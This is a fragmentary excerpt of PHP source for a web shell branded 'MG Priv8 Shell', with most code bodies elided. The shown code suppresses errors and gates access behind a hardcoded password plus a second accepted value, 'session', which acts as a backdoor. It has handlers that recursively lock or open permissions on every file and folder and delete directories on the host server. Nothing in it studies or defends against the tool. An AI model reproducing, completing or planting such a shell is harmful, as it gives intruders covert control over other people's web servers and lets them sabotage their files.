...
error_reporting(0);
	...
	$correctPassword = "bsl851"; //Change Password
	...
	if (isset($_POST['pass'])) {
		...
		if ($enteredPassword === $correctPassword or $enteredPassword === 'session') {
			...
			echo '<script>alert("oh thats sucks, try again dude");</script>';
		}
	}
...
<center>
	<br><br><br><br>
<font face="Bungee" size="5">MG Priv8 Shell</font></center>
...
function author() {
	echo "<center><br>MG Priv8</center>";
	exit();
}
...
$currentDirectory = '.';
    ...
    echo "<center>";
    echo "Message : <p style='color:#00ff00'>Green All Files? Y!</p>";
    echo "</center>";
}
...
if (isset($_GET['do']) && $_GET['do'] === 'dark_file') {
    ...
    changeFilePermissionsRecursive($currentDirectory, $newFilePermissions);
    echo "<center>";
    echo "Message : <p style='color:#00ff00'>Lock All Files? Y!</p>";
    echo "</center>";
}
...
if (isset($_GET['do']) && $_GET['do'] === 'dark_folders') {
    ...
    echo "<center>";
    echo "Message : <p style='color:#00ff00'>Lock All Folders? Y!</p>";
    echo "</center>";
}
...
if (isset($_GET['do']) && $_GET['do'] === 'root_folders') {
    ...
    changeFolderPermissionsRecursive($currentDirectory, $newFolderPermissions);
    echo "<center>";
    echo "Message : <p style='color:#00ff00'>Green All Folders? Y!</p>";
    echo "</center>";
}
...
if (isset($_GET['fileloc'])) {
	...
	if (is_dir($_POST['path'])) {
		...
		if (file_exists($_POST['path'])) {
			red("Delete Directory? F!");
		} else {
			green("Delete Directory? Y!");
			echo "string";
		}
